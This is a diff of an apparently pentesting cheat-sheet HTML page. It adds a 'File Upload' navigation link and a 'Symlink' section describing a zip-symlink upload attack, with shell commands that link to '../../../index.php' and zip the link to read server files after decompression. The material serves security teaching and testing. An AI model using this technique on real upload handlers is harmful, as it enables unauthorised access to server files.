@@ -123,6 +123,10 @@
                 </li>
                 <li class="">
                     
+    <a class="section-link" href="../file-upload/">File Upload</a>
+                </li>
+                <li class="">
+                    
     <a class="section-link" href="../jwt/">JWT</a>
                 </li>
                 <li class="">
@@ -310,6 +314,8 @@
     
         <li><a class="" href="#exploit-path-traversal-on-decompress">Exploit Path Traversal on decompress</a></li>
     
+        <li><a class="" href="#symlink">Symlink</a></li>
+    
     </ul>
     
 
@@ -350,6 +356,12 @@ def zip(dst):
 
 if __name__ == '__main__':
     zip('test')
+</code></pre>
+<h2 id="symlink">Symlink</h2>
+<p>Upload a link containing a symlink to an other file to access the remote file
+after the decompression:</p>
+<pre><code class="language-bash">ln -s ../../../index.php test.txt
+zip --symlinks test.zip test.txt
 </code></pre>
             
           </div>
